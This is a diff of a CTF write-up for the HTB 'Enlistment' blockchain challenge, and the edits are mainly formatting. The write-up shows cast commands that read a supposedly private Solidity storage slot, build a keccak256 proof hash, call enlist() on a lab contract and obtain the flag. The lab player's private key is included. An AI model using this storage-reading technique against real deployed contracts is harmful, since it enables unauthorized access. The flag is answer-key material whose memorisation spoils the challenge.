@@ -21,16 +21,17 @@ Reference:
 https://book.getfoundry.sh/introduction/overview
 ```
 Unzip the File
-![[blockchain_enlistment]](/assets/img/posts/2025-06-09-Enlistment/blockchain_enlistment.png)__blockchain_enlistment__
 
-42270 is used for rpc url
+![[blockchain_enlistment]](/assets/img/posts/2025-06-09-Enlistment/blockchain_enlistment.png)
+
+Port 42270 is used for rpc url
 ```
 RPC URL: http://94.237.59.89:42270/
 ```
 ![[rpc_url]](/assets/img/posts/2025-06-09-Enlistment/rpc_url.png)__rpc_url__
 
 Lets use nc on port 59016
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc 94.237.59.89 59016
 1 - Get connection information
@@ -47,8 +48,9 @@ Setup contract     : 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16
 RPC URL: http://94.237.59.89:42270/
 ```
 
-# setup.sol (Enlistment)
+#### setup.sol (Enlistment)
 Target Variables appears to be Enlistment Contract
+
 ```solidity
 // SPDX-License-Identifier: MIT
 
@@ -77,11 +79,11 @@ contract Setup {
 After further analysis, the **isSolved()** function's type data is **bool** which returns either **true or false**. It means that we must make sure that the player is actually done the transaction in Enlistement.sol
 
 We need to call the Target()  to get the Enlistement contract. Lets call the TARGET() function. This is used for enlistment contract
-```toml
+```bash
 cast call -r <RPC_URL> <SETUP_CONTRACT> "TARGET()"
 ```
 
-```toml
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ cast call -r http://94.237.59.89:42270/ 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16 "TARGET()"
 0x000000000000000000000000748c5f75488b89e1871c7a86a59ba5139d99ea53
@@ -89,7 +91,8 @@ cast call -r <RPC_URL> <SETUP_CONTRACT> "TARGET()"
 0x748c5f75488b89e1871c7a86a59ba5139d99ea53
 ```
 
-# Enlistment.sol (Enlistment)
+#### Enlistment.sol (Enlistment)
+
 ```solidity
 // SPDX-License-Identifier: MIT
 
@@ -111,16 +114,16 @@ contract Enlistment {
         enlisted[msg.sender] = true;
     }
 }
-
 ```
 
-## enlist() function (enlistment)
+#### enlist() function (enlistment)
 
 Lets analyze this enlist() function. 
 
 In authorized variable, type data it uses is **bool** which returns either **true or false** by comparing the proofHash with the public key and private key by using keccak256. 
 - If it match, the transaction get authorized.
 - If it doesn't match, it returns Invalid proof hash
+
 ```solidity
 function enlist(bytes32 _proofHash) public {
         bool authorized = _proofHash == keccak256(abi.encodePacked(publicKey, privateKey));
@@ -129,33 +132,35 @@ function enlist(bytes32 _proofHash) public {
     }
 ```
 
-#### Getting publicKey (Enlistment)
+###### Getting publicKey (Enlistment)
 Lets try to call the publicKey() function. there is 0000 at the end of it if you dont provide the bytes16. By default it use bytes32
 
-```toml
+```bash
 cast call -r <RPC_URL> <ENLISTMENT_CONTRACT> "publicKey()"
 ```
 
-```toml
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "publicKey()" 
 0x454e4c4953545f52455153542062793a00000000000000000000000000000000
 ```
 
 Lets just call the publicKey()(bytes16)
-```toml
+
+```bash
 cast call -r <RPC_URL> <ENLISTMENT_CONTRACT> "publicKey()(bytes16)"
 ```
 
-```toml
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "publicKey()(bytes16)" 
 0x454e4c4953545f52455153542062793a
 ```
 
-#### Getting privateKey (Enlistment)
+###### Getting privateKey (Enlistment)
 Lets call the privateKey()
-```toml
+
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "privateKey()" 
 Error: server returned an error response: error code 3: execution reverted, data: "0x"
@@ -165,19 +170,21 @@ Error: server returned an error response: error code 3: execution reverted, data
 Error: server returned an error response: error code 3: execution reverted, data: "0x"
 ```
 Got the following error
-```toml
+
+```bash
 Error: server returned an error response: error code 3: execution reverted, data: "0x"
 ```
 
 After further analysis, the main problem is the privateKey's visibility is **not public** but use **private** so it cannot be called directly using cast call
 
-![[privateKey used private not public]](/assets/img/posts/2025-06-09-Enlistment/privateKey used private not public.png)__privateKey used private not public__
+![[privateKey used private not public]](/assets/img/posts/2025-06-09-Enlistment/privateKey used private not public.png)
 
 REMEMBER: 
 **EVERYTHING IN BLOCKCHAIN IS PUBLIC, NO VARIABLE IS TRULY PRIVATE** **. It is not a good idea to hide the value even it uses the visibility as private.**
 
 Lets check the storage? Requires solidity compiler version 0.8.29
-```
+
+```bash
 ┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/enlistment/blockchain-enlistment]
 └─$ ./solc-static-linux --storage-layout Enlistment.sol              
 Error: Source file requires different compiler version (current compiler is 0.8.25+commit.b61c2a91.Linux.g++) - note that nightly builds are considered to be strictly less than the released version                                                                                                                                             
@@ -188,12 +195,14 @@ Error: Source file requires different compiler version (current compiler is 0.8.
 ```
 
 Lets download the latest version (0.8.30) from github
+
 ```
 https://github.com/ethereum/solidity/releases/download/v0.8.30/solc-static-linux
 ```
 
 Lets use solidity compiler to get the slot for private key
-```
+
+```bash
 ┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/enlistment/blockchain-enlistment]
 └─$ ./solc-static-linux --storage-layout Enlistment.sol
 
@@ -203,47 +212,54 @@ Contract Storage Layout:
 ```
 
 Lets get the publicKey and privateKey in this storage. This is 32 byte hex which combines the public key and private key
-```toml
+
+```bash
 cast call -r <RPC_URL> <ENLISTMENT_CONTRACT> <SLOT>
 ```
 
-```toml
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ cast storage -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 0
 0x20204147454e5420502e202331333337454e4c4953545f52455153542062793a
 ```
-![[get slot for privateKey]](/assets/img/posts/2025-06-09-Enlistment/get slot for privateKey.png)__get slot for privateKey__
+
+![[get slot for privateKey]](/assets/img/posts/2025-06-09-Enlistment/get slot for privateKey.png)
 
 Lets split this public and privatekey by 16 bytes. yep public key looks equal
 ```
 Public Key: 0x454e4c4953545f52455153542062793a
 Private key: 0x20204147454e5420502e202331333337
 ```
-![[Split public key and private key]](/assets/img/posts/2025-06-09-Enlistment/Split public key and private key.png)__Split public key and private key__
+
+![[Split public key and private key]](/assets/img/posts/2025-06-09-Enlistment/Split public key and private key.png)
 
 After further analysis, we need to pack the public key first then privateKey as the last one. 
+
 ```solidity
 keccak256(abi.encodePacked(publicKey, privateKey));
 ```
 
 Lets switch the private key and public key order. In this case, (privateKey, publicKey) to (privateKey to publicKey) and append it like this one
+
 ```
 454e4c4953545f52455153542062793a20204147454e5420502e202331333337
 ```
 
 Lets use cast keccak to get proofHash() for this
-```toml
+
+```bash
 cast keccak 0x<PUBLIC_KEY><PRIVATE_KEY>
 ```
 
-```toml
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ cast keccak 0x454e4c4953545f52455153542062793a20204147454e5420502e202331333337
 0x9d3f5567a25a1b5b3bc330351dcde6b026d5d22b120f52f040459d5794c48c59
 ```
 
-#### Information Collected (Enlistment)
+###### Information Collected (Enlistment)
 So we got the following information to moved on
+
 ```
 Player Private Key : 0x017207f107a58ef37b896d152a984d68ab7d66bc63ee4dea5f1e274a31c7ed36
 Player Address     : 0x691Ef9941563e8F915a4794e3D55dCa2d8C67109
@@ -258,13 +274,14 @@ Private key (16 bytes): 0x20204147454e5420502e202331333337
 Proof Hash: 0x9d3f5567a25a1b5b3bc330351dcde6b026d5d22b120f52f040459d5794c48c59
 ```
 
-#### enlist() execution (Enlistment)
+###### enlist() execution (Enlistment)
 Since we got the proof hash, Lets use cast send enlist() function. As the result it is successful
-```toml
+
+```bash
 cast send -r <RPC_URL> --private-key <PLAYER_PRIVATE_KEY> <ENLISTMENT_CONTRACT> "enlist(bytes32)" <PROOF_HASH_FROM_KECCAK>
 ```
 
-```toml
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ cast send -r http://94.237.59.89:42270/ --private-key 0x017207f107a58ef37b896d152a984d68ab7d66bc63ee4dea5f1e274a31c7ed36 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "enlist(bytes32)" 0x9d3f5567a25a1b5b3bc330351dcde6b026d5d22b120f52f040459d5794c48c59
 
@@ -287,8 +304,9 @@ blobGasUsed
 to                   0x748C5F75488b89E1871C7a86a59Ba5139D99eA53
 ```
 
-#### Verify isSolved() (Enlistment)
+###### Verify isSolved() (Enlistment)
 isSolved() function is to confirm whether the player address has successfully performed the enlisted in the enlist() function or not
+
 ```solidity
 Setup.sol
 
@@ -298,19 +316,21 @@ Setup.sol
 ```
 
 Lets verify the isSolved() function if returns **true** with cast call with player address. Yep it returns **true** (0x1)
-```toml
+
+```bash
 cast call -r <RPC_URL> <SETUP_CONTRACT> "isSolved()" <PLAYER_ADDRESS>
 ```
 
-```toml
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ cast call -r http://94.237.59.89:42270/ 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16 "isSolved()" 0x691Ef9941563e8F915a4794e3D55dCa2d8C67109
 0x0000000000000000000000000000000000000000000000000000000000000001
 ```
 
-#### Flag (Enlistment)
+###### Flag (Enlistment)
 Get the flag
-```
+
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc 94.237.59.89 59016                                                                                                                     
 1 - Get connection information
@@ -319,4 +339,4 @@ Get the flag
 Select action (enter number): 3
 HTB{gg_wp_w3lc0me_t0_th3_t34m}
 ```
-![[get the flag]](/assets/img/posts/2025-06-09-Enlistment/get the flag.png)__get the flag__
+![[get the flag]](/assets/img/posts/2025-06-09-Enlistment/get the flag.png)
